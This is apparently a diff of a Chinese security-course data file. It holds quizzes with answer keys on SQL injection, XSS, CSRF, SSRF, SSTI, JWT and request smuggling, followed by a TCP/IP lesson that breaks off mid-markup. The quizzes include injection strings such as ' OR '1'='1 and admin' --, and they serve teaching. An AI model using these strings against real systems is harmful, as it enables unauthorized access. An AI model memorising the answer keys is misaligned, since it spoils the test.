+      "question": "当你发现 Ghidra 反编译出的代码是一个巨大的 while 循环加 switch-case，这最可能是什么？",
+      "options": [
+        "正常的循环逻辑",
+        "递归函数",
+        "VM（虚拟机）保护",
+        "字符串加密"
+      ],
+      "answer": 2,
+      "explanation": "这种模式是 VM 保护的典型特征。程序实现了一个自定义的虚拟机，用数组模拟寄存器，switch-case 分发不同的指令处理器。这是逆向中最难处理的混淆技术之一。"
+    }
+  ],
+  "ctfg-04-01": [
+    {
+      "question": "SQL 注入测试中，输入 admin' -- 后引号的作用是？",
+      "options": [
+        "让数据库返回所有用户",
+        "闭合 SQL 语句中的字符串引号，-- 注释掉后续条件",
+        "删除数据库中的 admin 用户",
+        "绕过 XSS 过滤器"
+      ],
+      "answer": 1,
+      "explanation": "单引号用于闭合原始 SQL 语句中的字符串字面量，使后续输入成为 SQL 代码的一部分。-- 是 SQL 注释符，会注释掉语句的剩余部分（如密码检查条件）。"
+    },
+    {
+      "question": "RSA 小指数攻击（e=3）的前提条件是什么？",
+      "options": [
+        "n 必须足够小",
+        "明文 m 的 e 次方小于 n（m^3 < n），使得取模运算没有生效",
+        "密文必须是 Base64 编码的",
+        "必须知道私钥 d"
+      ],
+      "answer": 1,
+      "explanation": "当 e=3 且 m^3 < n 时，加密公式 c = m^e mod n 简化为 c = m^3（因为没有超过 n，取模不生效）。此时直接对 c 开三次方根即可得到明文 m。"
+    }
+  ],
+  "ctfg-05-01": [
+    {
+      "question": "binwalk 工具的主要功能是什么？",
+      "options": [
+        "网络流量分析",
+        "通过扫描文件中的魔术数字（magic bytes）来识别和提取嵌入的文件",
+        "密码暴力破解",
+        "内存镜像分析"
+      ],
+      "answer": 1,
+      "explanation": "binwalk 通过扫描二进制文件中的特征字节序列（魔术数字）来识别嵌入的文件类型，如 ZIP（PK\\x03\\x04）、PNG（\\x89PNG）等，并可以自动提取这些文件。"
+    },
+    {
+      "question": "在 CTF 取证题中，DNS 隧道通常如何隐藏 flag？",
+      "options": [
+        "在 DNS 响应中嵌入加密文件",
+        "将 flag 编码为 Base64 放在 DNS 查询的子域名中",
+        "通过 DNS 重定向到恶意服务器",
+        "修改 DNS 服务器的配置文件"
+      ],
+      "answer": 1,
+      "explanation": "DNS 隧道通常将数据编码为 Base64 字符串，放在 DNS 查询的子域名部分。分析时需要提取所有 DNS 查询的子域名，拼接后解码得到 flag。"
+    },
+    {
+      "question": "使用 Volatility 进行内存取证时，发现 powershell.exe 是从 cmd.exe 启动的且有 -enc 参数，应该怎么做？",
+      "options": [
+        "忽略这个进程，继续分析其他内容",
+        "将 -enc 后的 Base64 字符串解码（注意 UTF-16LE 编码），分析执行的命令",
+        "直接重启该进程",
+        "删除这个进程的内存数据"
+      ],
+      "answer": 1,
+      "explanation": "PowerShell 的 -enc 参数接受 Base64 编码的 UTF-16LE 字符串。攻击者常用这种方式隐藏恶意命令。解码后可以了解攻击者执行了什么操作，可能直接发现 flag 或进一步分析的线索。"
+    }
+  ],
+  "ctfg-06-01": [
+    {
+      "question": "pwntools 中 p64() 函数的作用是什么？",
+      "options": [
+        "将字符串转换为 Base64 编码",
+        "将整数按 64 位小端序打包为字节序列",
+        "生成 64 位随机数",
+        "连接到 64 位远程服务器"
+      ],
+      "answer": 1,
+      "explanation": "p64() 将整数按 64 位（8 字节）小端序（Little-Endian）打包为字节序列。例如 p64(0xdeadbeef) 输出 b'\\xef\\xbe\\xad\\xde\\x00\\x00\\x00\\x00'。对应的 u64() 函数用于解包。"
+    },
+    {
+      "question": "为什么建议使用 Python 虚拟环境来安装 CTF 工具包？",
+      "options": [
+        "虚拟环境运行速度更快",
+        "避免不同项目的依赖冲突，保持环境干净",
+        "虚拟环境自带安全工具",
+        "可以绕过系统的安全限制"
+      ],
+      "answer": 1,
+      "explanation": "Python 虚拟环境为每个项目创建独立的包空间，避免不同 CTF 工具之间的依赖版本冲突。同时也能保持系统 Python 环境的干净，方便排查问题。"
+    }
+  ],
+  "web-01-01": [
+    {
+      "question": "在 SQL 注入攻击中，攻击者输入 <code>' OR '1'='1</code> 能登录成功的根本原因是什么？",
+      "options": [
+        "密码太弱",
+        "后端直接将用户输入拼接到 SQL 语句中",
+        "数据库没有加密",
+        "浏览器没有过滤特殊字符"
+      ],
+      "answer": 1,
+      "explanation": "SQL 注入的根因是后端代码将用户输入直接拼接成 SQL 查询字符串，而不是使用参数化查询。OR '1'='1' 只是利用了 SQL 逻辑的恒真条件。"
+    },
+    {
+      "question": "以下哪种防御方式能从根本上杜绝 SQL 注入？",
+      "options": [
+        "过滤单引号",
+        "使用 WAF（Web 应用防火墙）",
+        "使用参数化查询（Prepared Statements）",
+        "限制输入长度"
+      ],
+      "answer": 2,
+      "explanation": "参数化查询将 SQL 代码和数据严格分离，数据库引擎不会把用户输入当作 SQL 指令执行。WAF 和输入过滤只是缓解措施，可能被绕过。"
+    },
+    {
+      "question": "UNION SELECT 攻击的前提条件是什么？",
+      "options": [
+        "知道数据库密码",
+        "注入点位于 SELECT 语句且列数匹配",
+        "服务器开启了 debug 模式",
+        "使用了 HTTPS"
+      ],
+      "answer": 1,
+      "explanation": "UNION 要求前后两个 SELECT 的列数和数据类型一致。攻击者通常先用 ORDER BY 探测列数，再用 UNION SELECT 拼接自己的查询。"
+    },
+    {
+      "question": "Blind SQL 注入（盲注）与普通 SQL 注入的核心区别是什么？",
+      "options": [
+        "盲注更危险",
+        "盲注不返回查询结果，只能通过页面行为差异推断数据",
+        "盲注只能攻击 MySQL",
+        "盲注不需要网络"
+      ],
+      "answer": 1,
+      "explanation": "盲注场景下，页面不会直接显示查询结果。攻击者只能通过页面是否正常、响应时间差异等方式逐位推断数据，虽然更慢但同样有效。"
+    }
+  ],
+  "web-03-01": [
+    {
+      "question": "反射型 XSS 和存储型 XSS 最本质的区别是什么？",
+      "options": [
+        "攻击载荷不同",
+        "恶意脚本是否被持久化存储在服务器端",
+        "反射型只能攻击 IE 浏览器",
+        "存储型不需要 JavaScript"
+      ],
+      "answer": 1,
+      "explanation": "反射型 XSS 的恶意代码在 URL 参数中\"反射\"到页面，需要诱导用户点击链接；存储型 XSS 的恶意代码被存入数据库，所有访问该页面的用户都会中招。"
+    },
+    {
+      "question": "以下哪种 HTTP Only Cookie 属性防御的是哪种 XSS 类型？",
+      "options": [
+        "防御所有 XSS",
+        "防止 JavaScript 读取 Cookie，缓解 Cookie 窃取",
+        "防止 SQL 注入",
+        "防止 CSRF 攻击"
+      ],
+      "answer": 1,
+      "explanation": "HttpOnly 属性让 JavaScript 无法通过 document.cookie 读取该 Cookie。这不能阻止 XSS 本身（恶意脚本仍可执行），但能有效缓解通过 XSS 窃取 Session Cookie 的攻击。"
+    },
+    {
+      "question": "DOM 型 XSS 与前两种 XSS 最大的不同是什么？",
+      "options": [
+        "DOM 型只影响移动端",
+        "恶意代码不经过服务器，完全在浏览器端通过 JS 操作 DOM 触发",
+        "DOM 型不能使用 alert()",
+        "DOM 型已经被淘汰了"
+      ],
+      "answer": 1,
+      "explanation": "DOM 型 XSS 的数据流完全在客户端：恶意输入通过 JavaScript 的 DOM 操作（如 innerHTML、document.write）直接写入页面。服务器完全不参与，因此服务端过滤无法防御。"
+    },
+    {
+      "question": "CSP（Content Security Policy）通过什么方式防御 XSS？",
+      "options": [
+        "加密 HTML",
+        "告诉浏览器哪些来源的脚本可以执行",
+        "删除所有 script 标签",
+        "阻止用户输入特殊字符"
+      ],
+      "answer": 1,
+      "explanation": "CSP 通过 HTTP 头部告诉浏览器只允许执行来自指定源的脚本。即使页面中存在恶意 <script> 标签，如果其来源不在白名单中，浏览器也会拒绝执行。"
+    }
+  ],
+  "web-04-01": [
+    {
+      "question": "CSRF 攻击能够成功的根本原因是什么？",
+      "options": [
+        "用户密码太简单",
+        "浏览器会自动在请求中附带目标域名的 Cookie",
+        "服务器没有加密数据",
+        "JavaScript 可以读取跨域 Cookie"
+      ],
+      "answer": 1,
+      "explanation": "浏览器的 Cookie 自动附带机制是 CSRF 的根因。无论请求从哪个页面发起，只要目标域名匹配，浏览器就会自动附带 Cookie，服务器无法区分请求是否由用户主动触发。"
+    },
+    {
+      "question": "CSRF Token 的防御原理是什么？",
+      "options": [
+        "加密所有请求",
+        "在每个表单中加入一个攻击者无法获取的随机值",
+        "阻止所有跨域请求",
+        "删除用户的 Cookie"
+      ],
+      "answer": 1,
+      "explanation": "CSRF Token 是服务器生成的随机值，嵌入在表单中。攻击者的恶意页面无法读取目标站点的页面内容（受同源策略保护），因此无法获取 Token，提交的请求会被服务器拒绝。"
+    },
+    {
+      "question": "SSRF 攻击与普通 CSRF 的关键区别是什么？",
+      "options": [
+        "SSRF 不需要网络",
+        "SSRF 利用的是服务器向外发起请求的能力，而非用户身份",
+        "SSRF 只能攻击 HTTPS 站点",
+        "SSRF 是 CSRF 的子类型"
+      ],
+      "answer": 1,
+      "explanation": "CSRF 冒充用户身份对服务器发起请求；SSRF 则是诱导服务器代替攻击者去访问内部资源（如内网服务、云元数据接口 169.254.169.254）。两者攻击目标完全不同。"
+    }
+  ],
+  "web-05-01": [
+    {
+      "question": "文件上传漏洞的核心利用条件是什么？",
+      "options": [
+        "上传文件大于 10MB",
+        "上传的文件能被服务器以代码方式执行",
+        "文件必须是图片格式",
+        "需要使用 POST 方法"
+      ],
+      "answer": 1,
+      "explanation": "文件上传漏洞的关键不是\"上传\"本身，而是上传后的文件能否被服务器解析执行。如果上传的 .php 文件被当作静态文件存储，就无法利用；但如果能被 Web 服务器解析执行，就变成了 Webshell。"
+    },
+    {
+      "question": "前端 JavaScript 校验文件类型为什么不能作为安全防线？",
+      "options": [
+        "JavaScript 运行太慢",
+        "攻击者可以用 Burp Suite 等工具绕过前端直接发送请求",
+        "JavaScript 不支持文件操作",
+        "前端校验会导致页面卡顿"
+      ],
+      "answer": 1,
+      "explanation": "前端校验只在浏览器中执行，攻击者可以拦截并修改 HTTP 请求，直接跳过前端 JS 校验。任何安全校验都必须在服务器端执行才有效。"
+    },
+    {
+      "question": "Content-Type 校验为什么可以被绕过？",
+      "options": [
+        "Content-Type 是加密的",
+        "Content-Type 由客户端设置，攻击者可以随意修改",
+        "服务器不支持 Content-Type",
+        "Content-Type 只能识别图片"
+      ],
+      "answer": 1,
+      "explanation": "HTTP 请求中的 Content-Type 是客户端声明的，攻击者可以把 .php 文件的 Content-Type 改为 image/jpeg。服务器如果只检查这个头部，就会被欺骗。"
+    }
+  ],
+  "web-06-01": [
+    {
+      "question": "反序列化漏洞的核心前提是什么？",
+      "options": [
+        "服务器使用了 JSON 格式",
+        "服务器对不可信的输入执行了反序列化操作",
+        "数据库没有加密",
+        "网络传输未使用 HTTPS"
+      ],
+      "answer": 1,
+      "explanation": "反序列化漏洞的根因是服务器对攻击者可控的输入执行了反序列化。攻击者构造恶意的序列化数据，在服务器还原对象的过程中触发代码执行。"
+    },
+    {
+      "question": "PHP 反序列化中，POP Chain（属性导向编程链）的作用是什么？",
+      "options": [
+        "加密序列化数据",
+        "将多个类的魔术方法串联起来，最终实现代码执行",
+        "防止反序列化漏洞",
+        "优化对象创建速度"
+      ],
+      "answer": 1,
+      "explanation": "POP Chain 是将多个看似无害的类通过魔术方法（__wakeup、__destruct、__toString 等）串联成攻击链的技术。单独看每个类都无害，但组合起来就能实现任意代码执行。"
+    },
+    {
+      "question": "为什么 Java 反序列化漏洞通常比 PHP 更危险？",
+      "options": [
+        "Java 运行更快",
+        "Java 生态中存在大量可被利用的第三方库（Gadget），且反序列化会自动触发方法调用",
+        "Java 不支持 JSON",
+        "PHP 已经修复了所有反序列化漏洞"
+      ],
+      "answer": 1,
+      "explanation": "Java 反序列化会自动调用 readObject()，触发链式调用。Apache Commons Collections、Spring 等流行库中大量存在可利用的 Gadget 类，使得攻击者无需自己编写恶意类即可构造利用链。"
+    }
+  ],
+  "web-07-01": [
+    {
+      "question": "SSTI（服务端模板注入）与普通 XSS 的关键区别是什么？",
+      "options": [
+        "SSTI 只能攻击静态页面",
+        "SSTI 的恶意代码在服务器端模板引擎中执行，可能实现远程代码执行（RCE）",
+        "SSTI 不需要用户输入",
+        "SSTI 只能使用 Python"
+      ],
+      "answer": 1,
+      "explanation": "XSS 是在用户浏览器中执行 JavaScript；SSTI 是在服务器端的模板引擎中执行恶意表达式。SSTI 可以读取服务器文件、执行系统命令，危害远大于 XSS。"
+    },
+    {
+      "question": "如何判断一个应用是否存在 SSTI 漏洞？",
+      "options": [
+        "查看页面加载速度",
+        "在输入中插入模板表达式（如 {{7*7}}），观察响应中是否出现计算结果 49",
+        "检查 HTTPS 证书",
+        "测试文件上传功能"
+      ],
+      "answer": 1,
+      "explanation": "SSTI 探测的核心方法是在用户输入中插入模板表达式。如果服务器将输入作为模板代码解析（而非纯文本），{{7*7}} 会在响应中显示为 49，证明模板注入存在。"
+    },
+    {
+      "question": "防御 SSTI 最根本的措施是什么？",
+      "options": [
+        "限制输入长度",
+        "永远不要将用户输入作为模板代码解析，使用安全的模板语法",
+        "禁用 JavaScript",
+        "使用 WAF"
+      ],
+      "answer": 1,
+      "explanation": "SSTI 的根因是用户输入被当作模板代码执行。最根本的防御是确保用户输入只作为数据传递给模板，而不是作为模板语法的一部分。例如 Jinja2 中应使用 {{ variable }} 而非 {{ user_input }}。"
+    }
+  ],
+  "web-08-01": [
+    {
+      "question": "JWT 的签名机制防御的是什么攻击？",
+      "options": [
+        "XSS 攻击",
+        "Token 被篡改——确保 payload 在传输过程中没有被修改",
+        "SQL 注入",
+        "CSRF 攻击"
+      ],
+      "answer": 1,
+      "explanation": "JWT 签名确保 Header 和 Payload 的完整性。如果有人修改了 payload 中的 role 字段（比如从 user 改为 admin），签名验证会失败，因为攻击者不知道密钥。"
+    },
+    {
+      "question": "JWT 的 None 算法攻击是怎么回事？",
+      "options": [
+        "使用更强的加密",
+        "攻击者将算法改为 none 并删除签名，某些库会接受未签名的 Token",
+        "删除 JWT 的 Header",
+        "使用空密码"
+      ],
+      "answer": 1,
+      "explanation": "JWT 规范允许 alg: none（表示不签名）。某些 JWT 库在验证时，如果 token 声明 alg 为 none，会跳过签名验证。攻击者可以利用这一点伪造任意内容的 token。"
+    },
+    {
+      "question": "OAuth 2.0 的 CSRF 攻击（state 参数缺失）会导致什么后果？",
+      "options": [
+        "密码泄露",
+        "攻击者可以把自己的第三方账号绑定到受害者的服务账号上",
+        "服务器崩溃",
+        "Cookie 被窃取"
+      ],
+      "answer": 1,
+      "explanation": "如果 OAuth 回调不验证 state 参数，攻击者可以预先用自己的身份登录第三方，获取授权码，然后诱导受害者点击回调链接。受害者的服务账号就会与攻击者的第三方账号关联。"
+    }
+  ],
+  "web-09-01": [
+    {
+      "question": "CORS 配置错误 <code>Access-Control-Allow-Origin: *</code> 加上 <code>Allow-Credentials: true</code> 为什么危险？",
+      "options": [
+        "会导致 XSS",
+        "浏览器规范禁止这种组合，但如果服务器手动返回这两个头部，攻击者可以从任意源读取用户的认证响应",
+        "会导致 SQL 注入",
+        "会让 Cookie 过期"
+      ],
+      "answer": 1,
+      "explanation": "浏览器规范禁止 Access-Control-Allow-Origin: * 与 Allow-Credentials: true 同时使用。但有些服务器错误地动态反射 Origin 值并设置 Allow-Credentials，这使得任意源的恶意页面都能通过 fetch 读取用户的认证数据。"
+    },
+    {
+      "question": "HTTP 请求走私攻击的核心原理是什么？",
+      "options": [
+        "加密 HTTP 头部",
+        "前端代理和后端服务器对 Content-Length/Transfer-Encoding 的解析不一致",
+        "使用 HTTPS 替代 HTTP",
+        "增加服务器带宽"
+      ],
+      "answer": 1,
+      "explanation": "当前端代理（如 Nginx/CDN）和后端服务器（如 Tomcat/Gunicorn）对同一个 HTTP 请求的边界判定不一致时，攻击者可以\"走私\"一个隐藏请求。这个隐藏请求会被后端单独处理，用于窃取数据或投毒缓存。"
+    },
+    {
+      "question": "CL.TE 走私和 TE.CL 走私的区别是什么？",
+      "options": [
+        "加密方式不同",
+        "CL.TE 是前端用 Content-Length、后端用 Transfer-Encoding；TE.CL 则相反",
+        "只是命名不同",
+        "一个用 GET 一个用 POST"
+      ],
+      "answer": 1,
+      "explanation": "CL.TE：前端代理按 Content-Length 判定请求边界，后端按 Transfer-Encoding 的 chunked 编码判定。TE.CL 相反。攻击者利用这个差异，构造一个在两端看来边界不同的请求，实现走私。"
+    }
+  ]
+};
+// Apply merge at runtime
+
+
+// ============================================================
+
+// ============================================================
+// CHECKPOINT QUIZ DATA (all modules merged)
+// ============================================================
+if (typeof SECTION_CHECKPOINTS !== 'undefined') {
+  } else {
+  }
+
+
+// NETWORKING MODULE - ADDITIONAL OVERRIDE (multi-line comment fix)
+// ============================================================
+
+SECTION_CONTENT["network"] = "<section id=\"network\" data-content-key=\"network\" data-chapter=\"net-01\">\r\n\r\n<div class=\"section-transition\"><p>密码学让我们学会加密数据——但加密后的数据如何从你的电脑到达服务器？这就是网络的工作。在本模块中，我们将跟随一个数据包穿越 TCP/IP 四层模型。</p></div>\r\n\r\n<h1>四层模型与封装：一个数据包的诞生</h1>\r\n\r\n<p>想象你在浏览器地址栏输入了 <code>http://cyberedu.cn</code>，然后按下回车。在那一瞬间，一场精密的\"封装工程\"就在你的操作系统内核中悄然启动了。你的 HTTP 请求——一段简单的文本——即将被层层包裹，像俄罗斯套娃一样，从一个应用程序的数据变成能在物理线缆上传输的电信号。</p>\r\n\r\n<p>这就是 TCP/IP 协议栈的核心机制。作为安全从业者，你必须理解每一层在做什么，因为<strong>每一层都是攻击面</strong>。</p>\r\n\r\n<h2>TCP/IP 四层模型速览</h2>\r\n\r\n<p>你可能听说过 OSI 七层模型——那是教科书里的理论框架。但在真实世界中，互联网使用的是 <strong>TCP/IP 四层模型</strong>。我们来对比一下：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  OSI 七层模型              TCP/IP 四层模型           实际协议举例\r\n  ─────────────────────     ─────────────────────     ──────────────────\r\n  7. 应用层          ─┐\r\n  6. 表示层          ─┤──&gt;  应用层 (Application)      HTTP, DNS, FTP, SSH\r\n  5. 会话层          ─┘\r\n  4. 传输层          ────&gt;  传输层 (Transport)        TCP, UDP\r\n  3. 网络层          ────&gt;  网际层 (Internet)         IP, ICMP\r\n  2. 数据链路层      ─┐\r\n                     ─┴──&gt;  网络接口层 (Link)         Ethernet, Wi-Fi\r\n  1. 物理层          ────&gt;  (硬件层面)\r\n</code></pre></div>\r\n\r\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>为什么安全课程用四层模型而不是七层？因为 Wireshark 抓到的包、防火墙规则、IDS 签名——几乎所有安全工具都基于 TCP/IP 模型来工作。理论归理论，实战归实战。</p></div>\r\n\r\n<h2>封装：俄罗斯套娃的艺术</h2>\r\n\r\n<p>当你在浏览器中发起一个 HTTP 请求时，数据会从上到下穿越每一层，每经过一层就被\"套\"上一个新的头部（Header）。这个过程叫做<strong>封装（Encapsulation）</strong>。</p>\r\n\r\n<p>让我们用 ASCII 图来看看一个 HTTP GET 请求被封装后的完整结构：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  ┌─────────────────────────────────────────────────────────────────────┐\r\n  │                    网络接口层 (Ethernet Frame)                       │\r\n  │  ┌───────────────────────────────────────────────────────────┐      │\r\n  │  │              网际层 (IP Packet)                            │      │\r\n  │  │  ┌────────────────────────────────────────────────┐       │      │\r\n  │  │  │         传输层 (TCP Segment)                    │       │      │\r\n  │  │  │  ┌──────────────────────────────────┐          │       │      │\r\n  │  │  │  │     应用层 (HTTP 数据)            │          │       │      │\r\n  │  │  │  │  GET / HTTP/1.1                  │          │       │      │\r\n  │  │  │  │  Host: cyberedu.cn               │          │       │      │\r\n  │  │  │  │  User-Agent: Mozilla/5.0         │          │       │      │\r\n  │  │  │  └──────────────────────────────────┘          │       │      │\r\n  │  │  │  [TCP Header: 20 bytes]                        │       │      │\r\n  │  │  └────────────────────────────────────────────────┘       │      │\r\n  │  │  [IP Header: 20 bytes]                                    │      │\r\n  │  └───────────────────────────────────────────────────────────┘      │\r\n  │  [Ethernet Header: 14 bytes]              [FCS: 4 bytes]            │\r\n  └─────────────────────────────────────────────────────────────────────┘\r\n</code></pre></div>\r\n\r\n<p>注意看：每一层的头部都<strong>包裹在内层数据的前面</strong>，就像信封套信封。最里面的内容是你的 HTTP 请求，最外面是 Ethernet 帧头。当这个数据包到达目标服务器时，接收方会从外到内逐层\"拆信封\"——这就是<strong>解封装（Decapsulation）</strong>。</p>\r\n\r\n<h2>逐层解剖：跟随数据包下行</h2>\r\n\r\n<h3>第一层：应用层 — HTTP 请求的诞生</h3>\r\n\r\n<p>一切始于你的浏览器。当你在地址栏输入 URL 并按下回车时，浏览器会构造一个 HTTP 请求：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-http\">\r\nGET / HTTP/1.1\r\nHost: cyberedu.cn\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\r\nConnection: keep-alive\r\n\r\n</code></pre></div>\r\n\r\n<p>这段文本大约 250 字节。它现在还是纯粹的<strong>应用层数据</strong>（Application Data），也叫做\"消息\"（Message）。浏览器会把它交给操作系统的网络协议栈。</p>\r\n\r\n<div class=\"callout warn\"><div class=\"callout-title\">安全视角</div><p>注意 <code>User-Agent</code> 字段——它会暴露你的操作系统和浏览器版本。攻击者可以据此判断你是否有已知漏洞。这就是为什么渗透测试人员经常修改 User-Agent。</p></div>\r\n\r\n<h3>第二层：传输层 — TCP 的分段与端口</h3>\r\n\r\n<p>应用层数据到达传输层后，TCP 协议会做三件事：</p>\r\n\r\n<ol>\r\n  <li><strong>添加源端口和目标端口</strong>：源端口是你的浏览器随机选的（比如 54321），目标端口是 HTTP 的标准端口 80</li>\r\n  <li><strong>添加序列号和确认号</strong>：用于保证数据的可靠传输和顺序重组</li>\r\n  <li><strong>添加校验和</strong>：用于检测数据在传输过程中是否损坏</li>\r\n</ol>\r\n\r\n<p>TCP 头部的结构如下：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  0                   1                   2                   3\r\n  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\r\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r\n |          Source Port          |       Destination Port        |\r\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r\n |                        Sequence Number                        |\r\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r\n |                    Acknowledgment Number                      |\r\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r\n | Offset| Res |U|A|P|R|S|F|            Window                   |\r\n |       |     |R|C|S|S|Y|I|                                     |\r\n |       |     |G|K|H|T|N|N|                                     |\r\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r\n |           Checksum            |         Urgent Pointer        |\r\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r\n</code></pre></div>\r\n\r\n<p>关键字段解读：</p>\r\n<ul>\r\n  <li><strong>Source Port (16 bit)</strong>：客户端随机端口，比如 <code>0xD431</code> = 54321</li>\r\n  <li><strong>Destination Port (16 bit)</strong>：<code>0x0050</code> = 80 (HTTP)</li>\r\n  <li><strong>Sequence Number (32 bit)</strong>：这个字段的第一个字节的序号</li>\r\n  <li><strong>Flags</strong>：URG、ACK、PSH、RST、SYN、FIN — 六个控制位，决定了这个包的\"性格\"</li>\r\n</ul>\r\n\r\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>在 Wireshark 中，你可以看到这些 flag 以缩写显示：<code>[SYN]</code>、<code>[SYN, ACK]</code>、<code>[ACK]</code>。这三个 flag 的组合就是大名鼎鼎的 TCP 三次握手——我们将在下一节详细讲解。</p></div>\r\n\r\n<h3>第三层：网际层 — IP 的寻址与路由</h3>\r\n\r\n<p>TCP 段（Segment）被交给 IP 协议后，IP 会添加自己的头部，形成一个<strong>IP 数据包（Packet）</strong>。IP 头部最重要的两个字段是：</p>\r\n\r\n<ul>\r\n  <li><strong>Source IP</strong>：你的电脑的 IP 地址，比如 <code>192.168.1.100</code></li>\r\n  <li><strong>Destination IP</strong>：目标服务器的 IP 地址，比如 <code>203.0.113.50</code></li>\r\n</ul>\r\n\r\n<p>IPv4 头部的完整结构：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  0                   1                   2                   3\r\n  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\r\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r\n |Version|  IHL  |Type of Service|          Total Length         |\r\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r\n |         Identification        |Flags|      Fragment Offset    |\r\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r\n |  Time To Live |   Protocol    |        Header Checksum        |\r\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r\n |                       Source Address                          |\r\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r\n |                    Destination Address                        |\r\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r\n</code></pre></div>\r\n\r\n<p>安全相关的关键字段：</p>\r\n<ul>\r\n  <li><strong>TTL (Time To Live)</strong>：每经过一个路由器就减 1，减到 0 时丢弃。默认值可以推断操作系统（Linux=64, Windows=128）。这也是 traceroute 的原理。</li>\r\n  <li><strong>Protocol</strong>：<code>6</code> = TCP，<code>17</code> = UDP，<code>1</code> = ICMP。告诉 IP 层\"里面装的是什么\"。</li>\r\n  <li><strong>Flags + Fragment Offset</strong>：控制分片。分片机制可以被利用来绕过防火墙——这是 net-05 的重点内容。</li>\r\n</ul>\r\n\r\n<h3>第四层：网络接口层 — Ethernet 帧的最后包装</h3>\r\n\r\n<p>IP 数据包最终被交给网络接口层（通常是 Ethernet 或 Wi-Fi），加上帧头和帧尾：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  Ethernet Frame 结构:\r\n  ┌──────────────┬──────────────┬──────────┬──────────────┬─────┐\r\n  │ Dest MAC     │ Source MAC   │ Type     │ Payload      │ FCS │\r\n  │ (6 bytes)    │ (6 bytes)    │ (2 bytes)│ (46-1500 B)  │(4 B)│\r\n  └──────────────┴──────────────┴──────────┴──────────────┴─────┘\r\n\r\n  Type = 0x0800 &gt; IPv4\r\n  Type = 0x0806 &gt; ARP\r\n  Type = 0x86DD &gt; IPv6\r\n</code></pre></div>\r\n\r\n<p>MAC 地址是硬件地址——你的网卡的\"身份证号\"。注意：<strong>MAC 地址只在本地网络有效</strong>。当数据包经过路由器时，MAC 地址会被替换为下一跳的 MAC，但 IP 地址保持不变。</p>\r\n\r\n<div class=\"callout warn\"><div class=\"callout-title\">安全视角</div><p>ARP 欺骗（ARP Spoofing）就是利用 MAC 地址和 IP 地址的映射关系来实施中间人攻击。攻击者发送伪造的 ARP 回复，让受害者的流量经过攻击者的机器。这在局域网渗透中是最经典的攻击手法之一。</p></div>\r\n\r\n<h2>真实抓包：看看封包的十六进制</h2>\r\n\r\n<p>光看理论不够——让我们打开 Wireshark，抓一个真实的 HTTP 请求来看看。</p>\r\n\r\n<p>下面是我在本机捕获的一个 HTTP GET 请求的完整 hex dump：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  Frame 42: 336 bytes on wire (2688 bits), 336 bytes captured\r\n  Ethernet II, Src: Dell_a1:b2:c3 (d4:be:d9:a1:b2:c3), Dst: Cisco_12:34:56 (00:1a:2b:12:34:56)\r\n\r\n  0000  00 1a 2b 12 34 56 d4 be d9 a1 b2 c3 08 00 45 00  ..+.4V........E.\r\n  0010  01 42 3c f1 40 00 40 06 b2 c3 c0 a8 01 64 cb 00  .B&lt;.@.@......d..\r\n  0020  71 32 d4 31 00 50 a1 b2 c3 d4 e5 f6 a7 b8 50 18  q2.1.P........P.\r\n  0030  fa f0 c5 a5 00 00 47 45 54 20 2f 20 48 54 54 50  ......GET / HTTP\r\n  0040  2f 31 2e 31 0d 0a 48 6f 73 74 3a 20 63 79 62 65  /1.1..Host: cybe\r\n  0050  72 65 64 75 2e 63 6e 0d 0a 55 73 65 72 2d 41 67  redu.cn..User-Ag\r\n  0060  65 6e 74 3a 20 4d 6f 7a 69 6c 6c 61 2f 35 2e 30  ent: Mozilla/5.0\r\n</code></pre></div>\r\n\r\n<p>让我们逐层解读这个 hex dump：</p>\r\n\r\n<h3>Ethernet 头部（前 14 字节）</h3>\r\n<div class=\"code-block\"><div 